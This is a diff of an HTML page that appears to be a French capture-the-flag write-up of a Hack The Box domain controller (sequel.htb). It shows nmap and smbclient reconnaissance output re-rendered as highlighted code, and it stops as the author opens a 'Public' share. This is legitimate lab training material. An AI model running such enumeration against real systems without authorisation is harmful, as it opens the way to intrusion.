@@ -7693,370 +7693,362 @@
 </table>
 <hr />
 <h3 id="nmap">Nmap</h3>
-<pre><code class="language-bash">pak@kali:~$ nmap -A -p- 10.129.81.126 -Pn  
-Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 14:12 CEST
-Nmap scan report for 10.129.81.126
-Host is up (0.013s latency).
-Not shown: 65516 filtered tcp ports (no-response)
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 20:14:07Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
-| ssl-cert: Subject: commonName=dc.sequel.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
-| Not valid before: 2022-11-18T21:20:35
-|_Not valid after:  2023-11-18T21:20:35
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.sequel.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
-| Not valid before: 2022-11-18T21:20:35
-|_Not valid after:  2023-11-18T21:20:35
-|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-| ms-sql-info: 
-|   10.129.81.126:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2019 RTM
-|       number: 15.00.2000.00
-|       Product: Microsoft SQL Server 2019
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Not valid before: 2023-10-14T20:11:04
-|_Not valid after:  2053-10-14T20:11:04
-| ms-sql-ntlm-info: 
-|   10.129.81.126:1433: 
-|     Target_Name: sequel
-|     NetBIOS_Domain_Name: sequel
-|     NetBIOS_Computer_Name: DC
-|     DNS_Domain_Name: sequel.htb
-|     DNS_Computer_Name: dc.sequel.htb
-|     DNS_Tree_Name: sequel.htb
-|_    Product_Version: 10.0.17763
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
-| ssl-cert: Subject: commonName=dc.sequel.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
-| Not valid before: 2022-11-18T21:20:35
-|_Not valid after:  2023-11-18T21:20:35
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.sequel.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
-| Not valid before: 2022-11-18T21:20:35
-|_Not valid after:  2023-11-18T21:20:35
-|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49674/tcp open  msrpc         Microsoft Windows RPC
-49697/tcp open  msrpc         Microsoft Windows RPC
-49702/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   date: 2023-10-14T20:14:57
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled and required
-|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pak@kali:~$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.81.126<span class="w"> </span>-Pn<span class="w">  </span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-10-14<span class="w"> </span><span class="m">14</span>:12<span class="w"> </span>CEST
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.81.126
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.013s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65516</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2023</span>-10-14<span class="w"> </span><span class="m">20</span>:14:07Z<span class="o">)</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-14T20:15:37+00:00<span class="p">;</span><span class="w"> </span>+7h59m59s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span class="w"> </span>DNS:dc.sequel.htb
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2022</span>-11-18T21:20:35
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2023</span>-11-18T21:20:35
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5?
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span class="w"> </span>DNS:dc.sequel.htb
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2022</span>-11-18T21:20:35
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2023</span>-11-18T21:20:35
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-14T20:15:37+00:00<span class="p">;</span><span class="w"> </span>+8h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="m">1433</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-sql-s<span class="w">      </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="m">15</span>.00.2000.00<span class="p">;</span><span class="w"> </span>RTM
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="p">|</span><span class="w"> </span>ms-sql-info:<span class="w"> </span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.81.126:1433:<span class="w"> </span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="p">|</span><span class="w">     </span>Version:<span class="w"> </span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="p">|</span><span class="w">       </span>name:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>RTM
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="p">|</span><span class="w">       </span>number:<span class="w"> </span><span class="m">15</span>.00.2000.00
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="p">|</span><span class="w">       </span>Product:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="p">|</span><span class="w">       </span>Service<span class="w"> </span>pack<span class="w"> </span>level:<span class="w"> </span>RTM
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="p">|</span><span class="w">       </span>Post-SP<span class="w"> </span>patches<span class="w"> </span>applied:<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="p">|</span>_<span class="w">    </span>TCP<span class="w"> </span>port:<span class="w"> </span><span class="m">1433</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-14T20:15:37+00:00<span class="p">;</span><span class="w"> </span>+7h59m59s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-10-14T20:11:04
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2053</span>-10-14T20:11:04
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="p">|</span><span class="w"> </span>ms-sql-ntlm-info:<span class="w"> </span>
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.81.126:1433:<span class="w"> </span>
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="p">|</span><span class="w">     </span>Target_Name:<span class="w"> </span>sequel
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="p">|</span><span class="w">     </span>NetBIOS_Domain_Name:<span class="w"> </span>sequel
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="p">|</span><span class="w">     </span>NetBIOS_Computer_Name:<span class="w"> </span>DC
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="p">|</span><span class="w">     </span>DNS_Domain_Name:<span class="w"> </span>sequel.htb
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="p">|</span><span class="w">     </span>DNS_Computer_Name:<span class="w"> </span>dc.sequel.htb
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="p">|</span><span class="w">     </span>DNS_Tree_Name:<span class="w"> </span>sequel.htb
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="p">|</span>_<span class="w">    </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.17763
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-14T20:15:37+00:00<span class="p">;</span><span class="w"> </span>+7h59m59s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span class="w"> </span>DNS:dc.sequel.htb
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2022</span>-11-18T21:20:35
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2023</span>-11-18T21:20:35
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span class="w"> </span>DNS:dc.sequel.htb
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2022</span>-11-18T21:20:35
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2023</span>-11-18T21:20:35
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-14T20:15:37+00:00<span class="p">;</span><span class="w"> </span>+8h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a><span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>mc-nmf<span class="w">        </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a><span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a><span class="m">49674</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a><span class="m">49697</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a><span class="m">49702</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>
+</span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
+</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a><span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2023</span>-10-14T20:14:57
+</span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
+</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>7h59m59s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>7h59m59s
+</span></code></pre></div>
 <p>Nous voyons le nom du domaine, sequel.htb, ainsi que tout les services usuels d'un DC. Pas de web, pas de services particuliers permettant de se frayer un accès ou d'avoir des infos... Mais un MSSQL est tout de même présent, j'imagine que le foothold se fera par là.</p>
 <p>On aperçoit aussi l'utilisation de certificat, à voir si ce sera à exploiter quelque-part, je me suis beaucoup renseigné sur le sujet mais je ne l'ai jamais réellement fait, ça peut être intéressant !</p>
 <p>Je commence par tenter un enum4linux classique, mais je n'obtiens pas de résultats particulier. Je passe donc sur smbclient pour voir si des partages sont accessibles :</p>
-<pre><code class="language-bash">pak@kali:~$ smbclient -L \\sequel.htb
-Password for [WORKGROUP\pak]:
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        Public          Disk      
-        SYSVOL          Disk      Logon server share
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pak@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="se">\\</span>sequel.htb
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\p</span>ak<span class="o">]</span>:
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">        </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span>---------<span class="w">       </span>----<span class="w">      </span>-------
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">        </span>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">        </span>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">        </span>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">        </span>Public<span class="w">          </span>Disk<span class="w">      </span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">        </span>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+</span></code></pre></div>
 <p>On voit un dossier "Public", donc je tente ma chance, mais sans trop y croire:</p>
-<pre><code class="language-bash">pak@kali:~$ smbclient //sequel.htb/Public
-Password for [WORKGROUP\pak]:
